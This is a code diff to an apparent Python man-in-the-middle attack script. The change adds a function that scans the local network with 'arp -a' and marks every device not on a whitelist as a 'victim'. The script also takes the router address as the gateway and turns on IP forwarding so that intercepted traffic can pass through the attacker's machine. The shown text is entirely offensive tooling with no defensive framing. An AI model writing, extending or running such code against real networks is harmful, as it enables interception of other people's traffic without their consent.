@@ -1,13 +1,32 @@
-import os
-import sys
+import subprocess, re, os, sys
 
+def get_victims():
+    whitelist = 'whitelist.txt'
+    victims = []
+    ip_str = subprocess.check_output(['arp','-a']) # use arp -a to get connected devices
+    ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list
+    
+    if not os.path.isfile(whitelist):
+        victims = ip_list
+        print("No %s! Continuing...") % whitelist
+    else:
+        for ip in ip_list:
+            if not ip in open('whitelist.txt').read():
+                #add ip to victim's list if it's not in whitelist.txt
+                victims.append(ip)
+            else:
+                print("Skipping whitelisted ip %s") % ip
+        
+    return victims
+    
 #get gateway_ip (router)
 gateway = sys.argv[1]
 print("gateway: " + gateway)
 # get victims_ip
-victims = [line.rstrip('\n') for line in open("victims.txt")]
-print("victims:")
-print(victims)
+victims = get_victims()
+print("victims: ")
+for v in victims:
+    print(v)
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
